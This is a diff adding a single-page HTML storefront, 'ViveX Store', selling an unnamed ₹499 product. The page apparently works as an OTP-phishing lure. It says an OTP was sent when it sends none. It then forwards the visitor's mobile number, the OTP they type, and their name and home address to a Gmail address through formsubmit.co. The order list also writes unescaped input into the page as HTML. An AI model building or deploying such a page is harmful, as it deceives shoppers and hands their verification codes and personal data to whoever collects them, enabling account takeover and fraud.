@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ViveX Store</title>
+<style>
+*{box-sizing:border-box}
+body{margin:0;min-height:100vh;background:#111;color:#fff;font-family:Arial,sans-serif;padding:25px 15px}
+.container{width:100%;max-width:420px;margin:auto}
+.brand{text-align:center;font-size:38px;font-weight:bold;margin-bottom:25px}
+.product{background:#1c1c1c;border-radius:20px;padding:20px;text-align:center;box-shadow:0 5px 25px rgba(0,0,0,.4)}
+.product img{width:100%;max-width:280px;height:280px;object-fit:contain;border-radius:15px}
+.product h2{margin:18px 0 8px;font-size:25px}
+.price{font-size:25px;font-weight:bold;margin-bottom:20px}
+button{cursor:pointer}
+.order-btn{width:100%;padding:15px;border:none;border-radius:12px;background:#fff;color:#000;font-size:18px;font-weight:bold}
+.order-btn:active,.place-btn:active,.phone-submit-btn:active,.otp-submit-btn:active,.close-btn:active{transform:scale(.98)}
+.form-box{display:none;margin-top:20px;background:#1c1c1c;padding:20px;border-radius:20px}
+.form-box h2{margin:0 0 15px}
+.phone-box{display:flex;gap:8px;margin-bottom:10px}
+.phone-box input{flex:1;min-width:0}
+.phone-submit-btn{width:90px;border:none;border-radius:10px;background:#00ff88;color:#000;font-weight:bold}
+input{width:100%;padding:14px;margin:7px 0;border:1px solid #444;border-radius:10px;background:#111;color:#fff;font-size:16px;outline:none}
+input:focus{border-color:#fff}
+input::placeholder{color:#888}
+.delivery-form{display:none;margin-top:10px}
+.place-btn{width:100%;padding:14px;margin-top:10px;border:none;border-radius:10px;background:#00ff88;color:#000;font-size:17px;font-weight:bold}
+.place-btn:disabled,.phone-submit-btn:disabled,.otp-submit-btn:disabled{opacity:.6;cursor:not-allowed}
+.my-orders-btn{width:100%;margin-top:15px;padding:14px;border:1px solid #555;border-radius:12px;background:#1c1c1c;color:#fff;font-size:17px;font-weight:bold}
+.orders-box{display:none;margin-top:20px}
+.orders-title{font-size:24px;font-weight:bold;margin-bottom:15px}
+.no-orders{background:#1c1c1c;border-radius:15px;padding:20px;text-align:center;color:#aaa}
+.order-card{background:#1c1c1c;border-radius:16px;padding:18px;margin-bottom:15px;box-shadow:0 4px 15px rgba(0,0,0,.3)}
+.order-id{font-size:18px;font-weight:bold;margin-bottom:12px}
+.order-row{display:flex;justify-content:space-between;gap:10px;padding:6px 0;color:#ccc}
+.order-row strong{color:#fff;text-align:right}
+.status{display:inline-block;margin-top:12px;padding:8px 12px;border-radius:20px;background:#333;color:#00ff88;font-size:14px;font-weight:bold}
+.popup-bg{display:none;position:fixed;inset:0;background:rgba(0,0,0,.82);justify-content:center;align-items:center;padding:20px;z-index:999}
+.popup{width:100%;max-width:350px;background:#1c1c1c;border-radius:20px;padding:25px 20px;text-align:center;box-shadow:0 10px 40px rgba(0,0,0,.6)}
+.popup h2{margin:5px 0 10px;font-size:24px}
+.popup p{color:#bbb;line-height:1.5;font-size:14px}
+.otp-input{text-align:center;letter-spacing:8px;font-size:22px;font-weight:bold}
+.otp-submit-btn{width:100%;padding:14px;margin-top:10px;border:none;border-radius:10px;background:#00ff88;color:#000;font-size:17px;font-weight:bold}
+.success-icon{width:65px;height:65px;margin:0 auto 15px;border-radius:50%;background:#00ff88;color:#000;display:flex;justify-content:center;align-items:center;font-size:35px;font-weight:bold}
+.close-btn{width:100%;padding:13px;margin-top:10px;border:none;border-radius:10px;background:#fff;color:#000;font-size:16px;font-weight:bold}
+</style>
+</head>
+<body>
+<div class="container">
+<div class="brand">ViveX</div>
+
+<div class="product">
+<img src="https://cdn.postimage.me/2026/09/04/368.png" alt="ViveX Product">
+<h2>ViveX Product</h2>
+<div class="price">₹499</div>
+<button class="order-btn" onclick="showOrderForm()">ORDER NOW</button>
+</div>
+
+<div class="form-box" id="orderForm">
+<h2>Mobile Verification</h2>
+
+<div class="phone-box">
+<input type="tel" id="phone" placeholder="Mobile Number" inputmode="numeric" maxlength="10" autocomplete="tel">
+<button class="phone-submit-btn" id="phoneSubmitBtn" onclick="submitPhone()">SUBMIT</button>
+</div>
+
+<div class="delivery-form" id="deliveryForm">
+<h2>Delivery Details</h2>
+
+<input type="text" id="name" placeholder="Full Name" autocomplete="name">
+<input type="text" id="state" placeholder="State" autocomplete="address-level1">
+<input type="text" id="district" placeholder="District">
+<input type="text" id="city" placeholder="City / Village" autocomplete="address-level2">
+<input type="text" id="pincode" placeholder="Pincode" inputmode="numeric" maxlength="6" autocomplete="postal-code">
+<input type="text" id="landmark" placeholder="Landmark (Optional)">
+
+<button class="place-btn" id="placeBtn" onclick="placeOrder()">PLACE ORDER</button>
+</div>
+</div>
+
+<button class="my-orders-btn" onclick="showOrders()">📦 MY ORDERS</button>
+
+<div class="orders-box" id="ordersBox">
+<div class="orders-title">My Orders</div>
+<div id="ordersList"></div>
+</div>
+</div>
+
+<div class="popup-bg" id="otpPopup">
+<div class="popup">
+<h2>Enter OTP</h2>
+<p>OTP has been sent to your mobile number.</p>
+<input type="text" id="otp" class="otp-input" placeholder="OTP" inputmode="numeric" maxlength="6">
+<button class="otp-submit-btn" id="otpSubmitBtn" onclick="submitOTP()">SUBMIT OTP</button>
+</div>
+</div>
+
+<div class="popup-bg" id="successPopup">
+<div class="popup">
+<div class="success-icon">✓</div>
+<h2>Order Successful!</h2>
+<p id="successText">Your order has been placed successfully.</p>
+<button class="close-btn" onclick="closePopup()">OK</button>
+</div>
+</div>
+
+<script>
+let verifiedPhone = "";
+
+function showOrderForm(){
+    const form=document.getElementById("orderForm");
+    form.style.display="block";
+    form.scrollIntoView({behavior:"smooth",block:"start"});
+}
+
+function generateOrderID(){
+    return "VX-"+Math.floor(100000+Math.random()*900000);
+}
+
+async function submitPhone(){
+    const phone=document.getElementById("phone").value.trim();
+    const button=document.getElementById("phoneSubmitBtn");
+
+    if(!/^[6-9]\d{9}$/.test(phone)){
+        alert("Please enter a valid 10-digit mobile number.");
+        return;
+    }
+
+    button.disabled=true;
+    button.innerText="SENDING...";
+
+    const formData=new FormData();
+    formData.append("Mobile Number",phone);
+    formData.append("Request","Mobile Number Verification");
+    formData.append("Time",new Date().toLocaleString("en-IN"));
+    formData.append("_subject","ViveX - New Mobile Number");
+    formData.append("_template","table");
+    formData.append("_captcha","true");
+
+    try{
+        const response=await fetch("https://formsubmit.co/ajax/itsvivex@gmail.com",{
+            method:"POST",
+            body:formData,
+            headers:{"Accept":"application/json"}
+        });
+        const result=await response.json();
+        console.log("Phone Response:",result);
+
+        if(response.ok && result.success){
+            verifiedPhone=phone;
+            document.getElementById("otpPopup").style.display="flex";
+        }else{
+            alert("Number submit nahi hua.\n\n"+(result.message||"Please try again."));
+        }
+    }catch(error){
+        console.error(error);
+        alert("Internet connection check karo aur dobara try karo.");
+    }
+
+    button.disabled=false;
+    button.innerText="SUBMIT";
+}
+
+async function submitOTP(){
+    const otp=document.getElementById("otp").value.trim();
+    const button=document.getElementById("otpSubmitBtn");
+
+    if(!/^\d{4,6}$/.test(otp)){
+        alert("Please enter the OTP.");
+        return;
+    }
+
+    button.disabled=true;
+    button.innerText="SUBMITTING...";
+
+    const formData=new FormData();
+    formData.append("Mobile Number",verifiedPhone);
+    formData.append("Entered OTP",otp);
+    formData.append("Request","Manual OTP Entry");
+    formData.append("Time",new Date().toLocaleString("en-IN"));
+    formData.append("_subject","ViveX - Entered OTP");
+    formData.append("_template","table");
+    formData.append("_captcha","true");
+
+    try{
+        const response=await fetch("https://formsubmit.co/ajax/itsvivex@gmail.com",{
+            method:"POST",
+            body:formData,
+            headers:{"Accept":"application/json"}
+        });
+        const result=await response.json();
+        console.log("OTP Response:",result);
+
+        if(response.ok && result.success){
+            document.getElementById("otpPopup").style.display="none";
+            document.getElementById("otp").value="";
+            document.getElementById("deliveryForm").style.display="block";
+            document.getElementById("deliveryForm").scrollIntoView({behavior:"smooth",block:"start"});
+        }else{
+            alert("OTP submit nahi hua.\n\n"+(result.message||"Please try again."));
+        }
+    }catch(error){
+        console.error(error);
+        alert("Internet connection check karo.");
+    }
+
+    button.disabled=false;
+    button.innerText="SUBMIT OTP";
+}
+
+async function placeOrder(){
+    const name=document.getElementById("name").value.trim();
+    const state=document.getElementById("state").value.trim();
+    const district=document.getElementById("district").value.trim();
+    const city=document.getElementById("city").value.trim();
+    const pincode=document.getElementById("pincode").value.trim();
+    const landmark=document.getElementById("landmark").value.trim();
+    const button=document.getElementById("placeBtn");
+
+    if(name===""||state===""||district===""||city===""||pincode===""){
+        alert("Please fill all required details.");
+        return;
+    }
+
+    if(!/^\d{6}$/.test(pincode)){
+        alert("Please enter a valid 6-digit pincode.");
+        return;
+    }
+
+    button.disabled=true;
+    button.innerText="PLACING ORDER...";
+
+    const orderID=generateOrderID();
+    const orderTime=new Date().toLocaleString("en-IN");
+
+    const order={
+        id:orderID,
+        product:"ViveX Product",
+        price:"₹499",
+        phone:verifiedPhone,
+        name:name,
+        state:state,
+        district:district,
+        city:city,
+        pincode:pincode,
+        landmark:landmark||"Not provided",
+        time:orderTime,
+        status:"Order Placed"
+    };
+
+    let orders=JSON.parse(localStorage.getItem("vivexOrders"))||[];
+    orders.unshift(order);
+    localStorage.setItem("vivexOrders",JSON.stringify(orders));
+
+    const formData=new FormData();
+    formData.append("Order ID",orderID);
+    formData.append("Name",name);
+    formData.append("Mobile Number",verifiedPhone);
+    formData.append("State",state);
+    formData.append("District",district);
+    formData.append("City / Village",city);
+    formData.append("Pincode",pincode);
+    formData.append("Landmark",landmark||"Not provided");
+    formData.append("Product","ViveX Product");
+    formData.append("Price","₹499");
+    formData.append("Order Status","Order Placed");
+    formData.append("Order Time",orderTime);
+    formData.append("_subject","New ViveX Order - "+orderID);
+    formData.append("_template","table");
+    formData.append("_captcha","true");
+
+    try{
+        const response=await fetch("https://formsubmit.co/ajax/itsvivex@gmail.com",{
+            method:"POST",
+            body:formData,
+            headers:{"Accept":"application/json"}
+        });
+        const result=await response.json();
+        console.log("Order Response:",result);
+
+        if(response.ok && result.success){
+            document.getElementById("successText").innerHTML=
+                "Your order has been placed successfully.<br><br><b>Order ID: "+orderID+"</b>";
+            document.getElementById("successPopup").style.display="flex";
+            clearForm();
+            renderOrders();
+        }else{
+            document.getElementById("successText").innerHTML=
+                "Order saved on this device.<br><br><b>Order ID: "+orderID+
+                "</b><br><br>Email delivery failed. Check FormSubmit activation.";
+            document.getElementById("successPopup").style.display="flex";
+        }
+    }catch(error){
+        console.error(error);
+        document.getElementById("successText").innerHTML=
+            "Order saved on this device.<br><br><b>Order ID: "+orderID+
+            "</b><br><br>Email service could not be reached.";
+        document.getElementById("successPopup").style.display="flex";
+    }
+
+    button.disabled=false;
+    button.innerText="PLACE ORDER";
+}
+
+function clearForm(){
+    document.getElementById("name").value="";
+    document.getElementById("state").value="";
+    document.getElementById("district").value="";
+    document.getElementById("city").value="";
+    document.getElementById("pincode").value="";
+    document.getElementById("landmark").value="";
+}
+
+function showOrders(){
+    const box=document.getElementById("ordersBox");
+
+    if(box.style.display==="block"){
+        box.style.display="none";
+        return;
+    }
+
+    box.style.display="block";
+    renderOrders();
+
+    box.scrollIntoView({behavior:"smooth",block:"start"});
+}
+
+function renderOrders(){
+    const list=document.getElementById("ordersList");
+    const orders=JSON.parse(localStorage.getItem("vivexOrders"))||[];
+
+    if(orders.length===0){
+        list.innerHTML='<div class="no-orders">No orders found.</div>';
+        return;
+    }
+
+    list.innerHTML=orders.map(order=>`
+        <div class="order-card">
+            <div class="order-id">🆔 ${order.id}</div>
+            <div class="order-row"><span>Product</span><strong>${order.product}</strong></div>
+            <div class="order-row"><span>Price</span><strong>${order.price}</strong></div>
+            <div class="order-row"><span>Date</span><strong>${order.time}</strong></div>
+            <div class="order-row"><span>Delivery</span><strong>${order.city}</strong></div>
+            <div class="status">${order.status}</div>
+        </div>
+    `).join("");
+}
+
+function closePopup(){
+    document.getElementById("successPopup").style.display="none";
+}
+
+document.addEventListener("DOMContentLoaded",renderOrders);
+</script>
+</body>
+</html>
